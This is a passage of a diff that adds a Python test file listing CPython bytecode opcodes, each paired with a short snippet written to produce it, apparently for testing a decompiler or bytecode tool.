+a = 1
+a *= 1
+
+#define INPLACE_MODULO           59
+a = 1
+a %= 1
+
+#define STORE_SUBSCR             60
+a = [1]
+a[0] = 1
+
+#define DELETE_SUBSCR            61
+a = [1]
+del a[0]
+
+#define BINARY_LSHIFT            62
+a = 1
+a = a &lt;&lt; 1
+
+#define BINARY_RSHIFT            63
+a = 1
+a = a &gt;&gt; 1
+
+#define BINARY_AND               64
+a = 1
+a = a &amp; 1
+
+#define BINARY_XOR               65
+a = 1
+a = a ^ 1
+
+#define BINARY_OR                66
+a = 1
+a = a | 1
+
+#define INPLACE_POWER            67
+a = 1
+a **= 1
+
+#define GET_ITER                 68
+for a in (1,2):
+    pass
+
+#define GET_YIELD_FROM_ITER      69
+def FUNC_GET_YIELD_FROM_ITER(b):
+    yield from b
+
+#define PRINT_EXPR               70
+# IGNORE: used only in interactive mode
+
+#define LOAD_BUILD_CLASS         71
+class a:
+    pass
+
+#define YIELD_FROM               72
+def FUNC_YIELD_FROM(b):
+    yield from b
+
+#define GET_AWAITABLE            73
+async def FUNC_GET_AWAITABLE(b):
+    await b()
+
+#define INPLACE_LSHIFT           75
+a = 1
+a &lt;&lt;= 1
+
+#define INPLACE_RSHIFT           76
+a = 1
+a &gt;&gt;= 1
+
+#define INPLACE_AND              77
+a = 1
+a &amp;= 1
+
+#define INPLACE_XOR              78
+a = 1
+a ^= 1
+
+#define INPLACE_OR               79
+a = 1
+a |= 1
+
+#define BREAK_LOOP               80
+for a in (1,2):
+    break
+
+#define WITH_CLEANUP_START       81
+#define WITH_CLEANUP_FINISH      82
+# from __future__ import with_statement
+with open(&quot;all.py&quot;) as f:
+    pass
+
+#define RETURN_VALUE             83
+# IGNORE: last opcode
+
+#define IMPORT_STAR              84
+from sys import *
+
+#define SETUP_ANNOTATIONS        85
+# captain: str
+
+#define YIELD_VALUE              86
+def FUNC_YIELD_VALUE():
+    a = 1
+    yield 1
+    a = 2
+
+#define POP_BLOCK                87
+for a in (1,2):
+    break
+
+#define END_FINALLY              88
+#define POP_EXCEPT               89
+try:
+    a = 1
+except ValueError:
+    a = 2
+finally:
+    a = 3
+
+#define HAVE_ARGUMENT            90
+# IGNORE: This is not really an opcode
+
+#define STORE_NAME               90
+a = 1
+
+#define DELETE_NAME              91
+a = 1
+del a
+
+#define UNPACK_SEQUENCE          92
+(a, b) = &quot;ab&quot;
+
+#define FOR_ITER                 93
+for i in (1,2):
+    pass
+
+#define UNPACK_EX                94
+t = (1, 2)
+(a, *b) = t
+
+#define STORE_ATTR               95
+#define DELETE_ATTR              96
+class A:
+    tmp = 0
+a = A()
+a.tmp = 0
+del a.tmp
+
+#define STORE_GLOBAL             97
+#define DELETE_GLOBAL            98
+# global g_a
+g_a = 1
+del g_a
+
+#define LOAD_CONST              100
+a = 1
+
+#define LOAD_NAME               101
+a = 1
+a = a
+
+#define BUILD_TUPLE             102
+a = 1;
+a = (a, a)
+
+#define BUILD_LIST              103
+a = [1,2,3]
+
+#define BUILD_SET               104
+{'a', 'b'}
+
+#define BUILD_MAP               105
+a = 'a'
+b = 'b'
+{a: 'a', b: 'b'}
+
+#define LOAD_ATTR               106
+[].sort()
+
+#define COMPARE_OP              107
+a = 1 == 2
+
+#define IMPORT_NAME             108
+# import sys
+
+#define IMPORT_FROM             109
+# from __future__ import division
+# from __future__ import with_statement
+
+#define JUMP_FORWARD            110
+if 1 == 2:
+    pass
+else:
+    pass
+
+#define JUMP_IF_FALSE_OR_POP    111
+def FUNC_JUMP_IF_FALSE_OR_POP():
+    return 1 and True
+
+#define JUMP_IF_TRUE_OR_POP     112
+def FUNC_JUMP_IF_TRUE_OR_POP():
+    return 0 or False
+
+#define JUMP_ABSOLUTE           113
+for i in (1,2):
+    pass
+
+#define POP_JUMP_IF_FALSE       114
+if 1 == 2:
+    pass
+
+#define POP_JUMP_IF_TRUE        115
+if not(1 == 2):
+    pass
+
+#define LOAD_GLOBAL             116
+# global g_a
+g_a = 1
+g_a = g_a
+
+#define CONTINUE_LOOP           119
+for x in (1,2):
+    try:
+        continue
+    except:
+        pass
+
+#define SETUP_LOOP              120
+while 0 &gt; 1:
+    pass
+
+#define SETUP_EXCEPT            121
+#define SETUP_FINALLY           122
+try:
+        a = 1
+except ValueError:
+        a = 2
+finally:
+        a = 3
+
+#define LOAD_FAST               124
+def FUNC_LOAD_FAST():
+    a = 1
+    a = a
+
+#define STORE_FAST              125
+def FUNC_STORE_FAST():
+    a = 1
+    a = a
+
+#define DELETE_FAST             126
+def FUNC_DELETE_FAST():
+    a = 1
+    del a
+
+#define STORE_ANNOTATION        127
+captain: str
+
+#define RAISE_VARARGS           130
+if 1 == 0:
+    raise ValueError
+
+#define CALL_FUNCTION           131
+#define MAKE_FUNCTION           132
+def a():
+    pass
+a()
+
+#define BUILD_SLICE             133
+a = [1,2,3,4]
+b = a[::-1]
+
+#define LOAD_CLOSURE            135
+#define LOAD_DEREF              136
+#define STORE_DEREF             137
+#define DELETE_DEREF            138
+def FUNC_CLOSURE():
+    a = 1
+    b = a
+    del a
+    def g():
+        return a + 1
+    return g()
+
+#define CALL_FUNCTION_KW        141
+&quot;{a}&quot;.format(a = 'test')
+
+#define CALL_FUNCTION_EX        142
+def f(a, b):
+    pass
+a = {&quot;a&quot;:1,&quot;b&quot;:2}
+f(**a)
+
+#define SETUP_WITH              143
+with open(&quot;all.py&quot;) as f:
+    pass
+
+#define EXTENDED_ARG            144
+while 0 &gt; 1:
+    pass
+
+#define LIST_APPEND             145
+a = [i * i for i in (1, 2)]
+
+#define SET_ADD                 146
+a = {i * i for i in (1, 2)}
+
+#define MAP_ADD                 147
+a = {1: i * i for i in (1, 2)}
+
+#define LOAD_CLASSDEREF         148
+def FUNC_LOAD_CLASSDEREF():
+    x = &quot;xlocal&quot;
+    y = &quot;ylocal&quot;
+    class C:
+        print(x)
+        print(y)
+        y = 1
+
+#define BUILD_LIST_UNPACK       149
+[*[1], *[2], *[3]]
+
+#define BUILD_MAP_UNPACK        150
+{**{&quot;a&quot;:1}, **{&quot;b&quot;:2}, **{&quot;c&quot;:3}}
+
+#define BUILD_MAP_UNPACK_WITH_CALL 151
+def f(a, b, c):
+    pass
+f(**{&quot;a&quot;:1}, **{&quot;b&quot;:2}, **{&quot;c&quot;:3})
+
+#define BUILD_TUPLE_UNPACK      152
+(*[1], *[2], 3, *[4, 5])
+
+#define BUILD_SET_UNPACK        153
+{*[1], *[2], 3, *[4, 5]}
+
+#define SETUP_ASYNC_WITH        154
+async def FUNC_SETUP_ASYNC_WITH(b):
+    async with b:
+        pass
+
+#define FORMAT_VALUE            155
+name = &quot;George&quot;
+f&quot;My cool string is called {name}.&quot;
+
+#define BUILD_CONST_KEY_MAP     156
+{'a': 1, 'a': 2}
+
+#define BUILD_STRING            157
+name = &quot;George&quot;
+f&quot;My cool string is called {name}.&quot;
+
+#define BUILD_TUPLE_UNPACK_WITH_CALL 158
+def f(a, b):
+    pass
+f(*[1], *[2])
+</code></pre></article></body></html>
